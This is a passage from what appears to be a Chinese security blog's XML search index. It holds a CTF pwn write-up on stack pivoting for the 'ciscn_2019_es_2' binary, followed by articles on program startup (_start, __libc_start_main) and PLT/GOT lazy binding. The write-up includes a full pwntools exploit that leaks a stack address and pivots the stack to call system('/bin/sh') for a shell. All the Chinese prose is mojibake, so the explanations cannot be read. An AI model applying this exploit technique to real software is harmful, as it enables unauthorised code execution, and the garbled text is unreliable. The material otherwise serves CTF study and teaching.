ˆä¸Šçš„åœ°å€æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿåˆ«æ€¥ï¼Œæ…¢æ…¢æ¥ï¼</p><p>åœ¨ç¬¬ä¸€æ¬¡<code>read</code>ï¼ˆï¼‰çš„æ—¶å€™ï¼Œæˆ‘è¾“å…¥äº†24ä¸ª<code>a</code>å’Œæˆ‘çš„<code>id</code>ï¼Œè®¡ç®—ä¸€ä¸‹sçš„ä½ç½®åˆ°<code>ebp</code>çš„è·ç¦»ï¼Œæ‹¿èµ·ä½ çš„å°è®¡ç®—å™¨è®¡ç®—ä¸€ä¸‹ï¼š<code>0xa8 - 0x80</code> æ˜¯ä¸æ˜¯ç­‰äº0x28ï¼Œè‡³äºä¸ºå•¥è¦åˆ°<code>ebp</code>å‘¢ï¼Œåˆ«é—®ï¼Œé—®å°±æ˜¯åé¢å¥½å®šä½åç§»</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132246238.png" class=""><p>æŒ‰ç…§ä¸Šé¢çš„æƒ³æ³•æˆ‘ä»¬å†™å‡ºä¸‹é¢çš„exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å‰é¢æˆ‘è¯´è¿‡ï¼Œæˆ‘ä»¬æ ˆè¿ç§»æ˜¯è¿ç§»åˆ°å¦ä¸€ä¸ªæœ‰æˆ‘ä»¬ROPé“¾çš„åœ°æ–¹ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰åŠæ³•å¾€å…¶ä»–åœ°æ–¹å†™å…¥æˆ‘ä»¬çš„ROPé“¾ï¼Œæˆ‘ä»¬åªèƒ½å¾€æ ˆä¸Šå†™å…¥ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼Œæ ˆè¿ç§»åˆ°æ ˆä¸Šï¼Œè¿™æ ·æˆ‘ä»¬åˆšåˆšæ³„éœ²çš„æ ˆåœ°å€å°±æœ‰ç”¨äº†æ˜¯ä¸ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¬¬äºŒæ¬¡readï¼ˆï¼‰çš„æ—¶å€™å°±å°†æ ˆå¸ƒç½®æˆè¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br></pre></td></tr></table></figure><p>å’±åŠ¨è°ƒçœ‹çœ‹ï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132304965.png" class=""><p>leaveä¹‹åï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132322783.png" class=""><p>æ³¨æ„<code>esp</code>å’Œ<code>ebp</code>ï¼Œæ˜¯ä¸æ˜¯<code>esp</code>æ¯”<code>ebp</code>è¿˜å¤§å“ˆå“ˆå“ˆ:</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132336295.png" class=""><p>å†å¾€ä¸‹æ‰§è¡Œï¼Œå’±å°±å‘ç°<code>esp</code>æŒ‡å‘äº†<code>system</code>çš„<code>plt</code>ï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132348696.png" class=""><p>å®Œæ•´EXPï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node3.buuoj.cn&#x27;,27587)</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">ebp_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">io.success(<span class="string">&#x27;[*] ebp_addr: &#x27;</span> + <span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFå°çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mainçœŸçš„æ˜¯å‡½æ•°å…¥å£å—ï¼Ÿ</title>
      <link href="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/"/>
      <url>/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€‹        åœ¨æˆ‘ä»¬å¼€å§‹å­¦ä¹ Cè¯­è¨€çš„æ—¶å€™ï¼Œè€å¸ˆå°±è·Ÿæˆ‘ä»¬è®²â€mainå‡½æ•°å°±æ˜¯ç¨‹åºå¼€å§‹æ‰§è¡Œçš„åœ°æ–¹â€ï¼Œæ‰€æœ‰çš„ä»£ç éƒ½æ˜¯ä»è¿™é‡Œå¼€å§‹çš„ï¼Œå¯äº‹å®çœŸçš„æ˜¯è¿™æ ·çš„å—ï¼Ÿ</p></blockquote><p>â€œæ‰€æœ‰â€ï¼Ÿè¿™ä¸ªè¯ä¼¼ä¹æœ‰ç‚¹ä»¥åæ¦‚å…¨ï¼Œå¦‚æœmainå‡½æ•°å°±æ˜¯ä¸€åˆ‡çš„å¼€å§‹ï¼Œé‚£ä¹ˆç¨‹åºçš„å †æ ˆï¼Œmainå‡½æ•°ä¼ é€’çš„å‚æ•°ï¼ŒI/Oæ“ä½œæ˜¯å‡­ç©ºå‡ºç°çš„å—ï¼Ÿæ˜¾ç„¶ä¸æ˜¯ï¼Œæ˜¯æ“ä½œç³»ç»Ÿåœ¨mainå‡½æ•°ä¹‹å‰ï¼Œå°±å·²ç»å¸®æˆ‘ä»¬åˆå§‹åŒ–å¥½äº†ä¸€åˆ‡ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„mainå‡½æ•°æ‰èƒ½é¡ºåˆ©æ‰§è¡Œï¼Œé‚£ä¹ˆå…¥å£ç‚¹ä¸æ˜¯mainï¼Œé‚£ä¼šæ˜¯è°å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç¼–è¯‘ä¸€ä¸ªé™æ€çš„demoå¹¶å¯¹mainå‡½æ•°è¿›è¡Œäº¤å‰å¼•ç”¨ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°å®ƒçš„åå­—å«<code>start</code>ï¼Œå½“æˆ‘ä»¬è·Ÿè¿›å»çš„æ—¶å€™ï¼Œå°±èƒ½å‘ç°å¦ä¸€ä¸ªæ–°çš„ä¸–ç•Œï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/1-1633405730636.png" class=""><p>åœ¨IDAé‡Œé¢å¯ä»¥çœ‹åˆ°<code>_start</code>çš„æ±‡ç¼–ï¼Œ<code>_start</code>å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ä¸ŠåŠéƒ¨åˆ†</p><p>ä¸Šé¢çš„<code>_start</code>å‡½æ•°æ˜¯<code>x86</code>ä¸‹çš„ï¼ˆæœ‰åšåˆ å‡ï¼‰ï¼Œä¸‹é¢çš„æ˜¯<code>x86-64</code>ï¼Œå¯¹æ¯”æ¥çœ‹<code>x86</code>çš„å°±é•¿äº†å¾ˆå¤šï¼ŒåŸå› æ˜¯å› ä¸ºå‹æ ˆçš„æ—¶å€™ï¼Œä¸èƒ½ç›´æ¥å°†å†…å­˜ä¸­çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œéœ€è¦å­˜åˆ°åå¯„å­˜å™¨å†å‹å…¥æ ˆä¸­ï¼Œè™½ç„¶é•¿äº†ç‚¹ï¼Œä½†è°ƒç”¨çš„æœ¬è´¨éƒ½æ˜¯ä¸€æ ·çš„</p><ul><li><code>xor ebp,ebp</code>å°†<code>ebp</code>è¿›è¡Œå¼‚æˆ–ç½®ä¸º0å®Œæˆå¯¹æ ˆåº•æŒ‡é’ˆçš„åˆå§‹åŒ–ï¼Œä¹‹å<code>pop esi</code>å°†<code>argc</code>å¼¹å‡ºåˆ°<code>esi</code>ä¸­ï¼Œå› ä¸ºå†æœ€å¼€å§‹åˆå§‹åŒ–çš„æ—¶å€™å°±å·²ç»å°†<code>env,argv,argc</code>å‹å…¥æ ˆä¸­ï¼Œå¹¶ä¸”<code>esp</code>æŒ‡å‘äº†<code>argc</code>çš„ä½ç½®ï¼Œä¹‹åå°±å°†<code>esp</code>è¿›è¡Œå¼‚æˆ–<code>0FFFFFFF0h</code>ï¼Œ<code>esp</code>ä¼šæ ¹æ®å½“å‰çš„ä½ç½®ä¸‹é™<code>0-15</code>ä¸ªå­—èŠ‚ï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿç›®çš„æ˜¯ä¸ºäº†å¯¹é½ï¼Œä¿è¯æ ˆä¸Šæ‰€æœ‰çš„å˜é‡éƒ½èƒ½å¤Ÿè¢«å†…å­˜å’Œ<code>cache</code>å¿«é€Ÿçš„è®¿é—®</li></ul><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/2-1633405730636.png" class=""><blockquote><p><code>env</code>æ˜¯ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬ç³»ç»Ÿçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œæ‰€ä»¥<code>__environ</code>ä¸€ç›´æŒ‡å‘çš„ä¸€ç›´éƒ½æ˜¯æ ˆä¸Šçš„åœ°å€ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå®ƒèƒ½å¤Ÿæ³„éœ²æ ˆåœ°å€çš„åŸå› ï¼Œå¹³æ—¶åœ¨è·¯ç”±å™¨é‡Œé¢æ‰§è¡Œ<code>printenv</code>çš„æ—¶å€™å°±èƒ½æ‰“å°è·¯ç”±å™¨çš„ç¯å¢ƒå˜é‡ï¼Œè¿™å¯¹äºæ¥ä¸‹æ¥çš„æ”»å‡»ä¹Ÿæœ‰å¾ˆå¤§çš„è¾…åŠ©ä½œç”¨</p></blockquote><ul><li><p>ä¹‹åçš„è¯­å¥å°±æ˜¯å‹å…¥<code>___libc_start_main</code>å‡½æ•°æ‰€éœ€è¦çš„å‚æ•°ï¼Œä¸ºäº†å­—èŠ‚å¯¹é½ï¼Œå‹å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°<code>eax</code>åªæœ‰å¯¹é½çš„æ•ˆæœï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨åˆ°ï¼Œä¸‹é¢çš„å‚æ•°å°±æ˜¯æŒ‰ç…§<code>__libc_start_main</code>çš„å‡½æ•°å®šä¹‰ä¾æ¬¡å‹å…¥ï¼Œ<code>stack_end</code>æ˜¯æ ˆé¡¶æŒ‡é’ˆï¼Œ<code>rtld_fini</code>åŠ¨æ€åŠ è½½æœ‰å…³çš„æ”¶å°¾å·¥ä½œï¼Œ<code>init</code>ä¸ºmainè°ƒç”¨å‰çš„åˆå§‹åŒ–ï¼Œ<code>fini</code>ä¸ºmainå‡½æ•°ç»“æŸä¹‹åçš„æ”¶å°¾å·¥ä½œ </p><p><code>__libc_start_main</code>åœ¨<code>libc-start.c</code>çš„æ–‡ä»¶é‡Œé¢ï¼Œå…¶å‡½æ•°å®šä¹‰å¦‚ä¸‹</p></li></ul><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">             <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">             <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure></blockquote><ul><li>å½“<code>___libc_start_main</code>æ­£å¸¸æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šåœ¨<code>exit</code>å¤„é€€å‡ºï¼Œè€Œ<code>hlt</code>çš„æ˜¯ä¸ºäº†ä¿è¯ç¨‹åºåœ¨<code>___libc_start_main</code>è°ƒç”¨å¤±è´¥çš„æ—¶å€™ä¸ä¼šè®©ç¨‹åºä¸€ç›´åœ¨è·‘ï¼Œå®ƒå°±æ˜¯å……å½“ä¸€ä¸ªæ …æ ï¼Œå¼ºè¡ŒæŠŠç¨‹åºåœä¸‹æ¥.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:08048340 _start          proc near               ; DATA XREF: LOAD:08048018â†‘o</span><br><span class="line">.text:08048340                 xor     ebp, ebp</span><br><span class="line">.text:08048342                 pop     esi</span><br><span class="line">.text:08048343                 mov     ecx, esp</span><br><span class="line">.text:08048345                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08048348                 push    eax</span><br><span class="line">.text:08048349                 push    esp             ; stack_end</span><br><span class="line">.text:0804834A                 push    edx             ; rtld_fini</span><br><span class="line">.text:08048356                 lea     eax, (__libc_csu_fini - 804A000h)[ebx]</span><br><span class="line">.text:0804835C                 push    eax             ; fini</span><br><span class="line">.text:0804835D                 lea     eax, (__libc_csu_init - 804A000h)[ebx]</span><br><span class="line">.text:08048363                 push    eax             ; init</span><br><span class="line">.text:08048364                 push    ecx             ; ubp_av</span><br><span class="line">.text:08048365                 push    esi             ; argc</span><br><span class="line">.text:08048366                 mov     eax, offset main</span><br><span class="line">.text:0804836C                 push    eax             ; main</span><br><span class="line">.text:0804836D                 call    ___libc_start_main</span><br><span class="line">.text:08048372                 hlt</span><br><span class="line">.text:08048372 _start          endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400450 _start          proc near               ; DATA XREF: LOAD:0000000000400018â†‘o</span><br><span class="line">.text:0000000000400450 ; __unwind &#123;</span><br><span class="line">.text:0000000000400450                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400452                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400455                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400456                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000400459                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040045D                 push    rax</span><br><span class="line">.text:000000000040045E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000040045F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:0000000000400466                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:000000000040046D                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400474                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:000000000040047A                 hlt</span><br><span class="line">.text:000000000040047A ; &#125; // starts at 400450</span><br></pre></td></tr></table></figure><p>åˆ é™¤å¤§é‡çš„å®ä¹‹åï¼Œç•™ä¸‹äº†ä¸€äº›æ¯”è¾ƒé‡è¦çš„å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p><blockquote><p><code>atexit</code>å‡½æ•°æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯å½“<code>main</code>å‡½æ•°è¿”å›çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œ</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="keyword">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"><span class="comment">//=======================================</span></span><br><span class="line"></span><br><span class="line">  __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">  __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><p>ç¨‹åºçš„æœ€ç»ˆè°ƒç”¨é“¾ï¼ˆç®€åŒ–ç‰ˆï¼‰æ˜¯ï¼š</p><p><code>_start -&gt; __libc_start_main -&gt; __libc_csu_init -&gt; main -&gt; exit</code></p><p>çœ‹å®Œä¹‹åï¼Œçœ‹çœ‹ä¸‹é¢è¿™å¼ å›¾ç‰‡æ˜¯ä¸æ˜¯å¾ˆäº²åˆ‡ï¼</p><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/3-1633405730636.png" class=""><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://luomuxiaoxiao.com/?p=516#i">Linux X86 ç¨‹åºå¯åŠ¨ â€“ mainå‡½æ•°æ˜¯å¦‚ä½•è¢«æ‰§è¡Œçš„ï¼Ÿ</a></p><p>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹P317</p>]]></content>
      
      
      
        <tags>
            
            <tag> åº•å±‚çš„å°å•¾å•¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å»¶è¿Ÿç»‘å®š</title>
      <link href="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
      <url>/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<p>ç¨‹åºåœ¨åŠ¨æ€è½½å…¥å†…å­˜çš„æ—¶å€™å¹¶ä¸ä¼šå°†æ‰€æœ‰å‡½æ•°éƒ½åŠ è½½è¿›å†…å­˜ï¼Œè€Œæ˜¯é‡‡ç”¨å»¶æ—¶ç»‘å®šçš„æœºåˆ¶ï¼Œå³å½“çœŸæ­£ä½¿ç”¨å½“è¯¥å‡½æ•°çš„æ—¶å€™æ‰å°†<code>GOT</code>è¡¨ä¸­çš„åœ°å€è½¬åŒ–æˆçœŸå®çš„åœ°å€ï¼Œ</p><p>å†™ä¸€ä¸ªç®€å•çš„<code>demo</code>è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -g -o got_plt got_plt.c </span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆåï¼Œæˆ‘ä»¬è¿›å…¥<code>gdb</code>è¿›è¡Œè°ƒè¯•ï¼Œå…ˆå°†ç¨‹åºåæ±‡ç¼–ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹åœ¨é‚£ä¸‹æ–­ç‚¹åˆé€‚ï¼Œæˆ‘ä»¬æ—¢ç„¶è¦ç ”ç©¶<code>plt</code>å’Œ<code>got</code>è¡¨ï¼Œé‚£è‚¯å®šè¦æ–­åœ¨<code>call put</code>è¿™æ¡æ±‡ç¼–æŒ‡ä»¤è¿™å§ï¼Œä¸‹æ–­ç‚¹æˆ‘ä»¬æ¥çœ‹çœ‹</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/3.png" class=""><p>ä¸‹å®Œæ–­ç‚¹ï¼Œæˆ‘ä»¬è¿è¡Œèµ·æ¥ï¼Œå•æ­¥æ­¥å…¥å°±æ¥åˆ°å›¾ä¸­çš„åœ°æ–¹ï¼Œå®ƒå…ˆè·³åˆ°<code>_GLOBAL_OFFSET_TABLE_</code>é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„<code>GOT</code>è¡¨ï¼Œé‚£å®ƒä¼š<code>JMP</code>åˆ°å“ªé‡Œå»å‘¢ï¼Ÿç­‰ä¸‹æ­æ™“â€¦.</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1.png" class=""><p>æˆ‘ä»¬ç”¨<code>pwndbg</code>æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªä½ç½®å­˜äº†ä»€ä¹ˆï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹çœ¼ç†Ÿï¼Œè¿™ä¸å°±æ˜¯åˆšåˆš<code>JMP</code>çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°æ–¹å—ï¼Ÿæ²¡é”™å®ƒåˆè·³å›æ¥äº†â€¦ç´§æ¥ç€å®ƒ<code>push</code>äº†ä¸€ä¸ªå‚æ•°åˆå¾€ä¸‹è·³è½¬äº†ï¼Œåˆ<code>push</code>äº†ä¸€ä¸ªå‚æ•°å°±è·³åˆ°<code>_dl_runtime_resolve_</code>è¿™ä¸ªå‡½æ•°é‡Œé¢ï¼Œåœ¨è¿™å°±ä¸è¯¦ç»†çš„é˜è¿°<code>_dl_runtime_resolve_</code>å‡½æ•°çš„å…·ä½“å®ç°ï¼Œå’±åªè¦è®°å¾—æ˜¯è¿™ä¸ªå‡½æ•°å¸®æˆ‘ä»¬æŠŠ<code>GOT</code>è¡¨é‡Œé¢çš„å€¼æ¢æˆäº†çœŸå®çš„å‡½æ•°åœ°å€</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/2.png" class=""><p>æˆ‘ä»¬åœ¨æ­¤å‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åå†å»çœ‹<code>0x804a00c</code>é‡Œé¢å­˜çš„æ˜¯ä»€ä¹ˆï¼Œå¯¹å§â€¦ç°åœ¨å°±æ˜¯çœŸå®çš„å‡½æ•°åœ°å€</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/4.png" class=""><p>å¦‚æœè¿˜æ˜¯ä¿æŒæ€€ç–‘ï¼Œæˆ‘ä»¬åæ±‡ç¼–è¿›å»çœ‹çœ‹ï¼Œæ˜¯<code>put</code>å‡½æ•°çš„å®ç°å¯¹å§â€¦</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5.png" 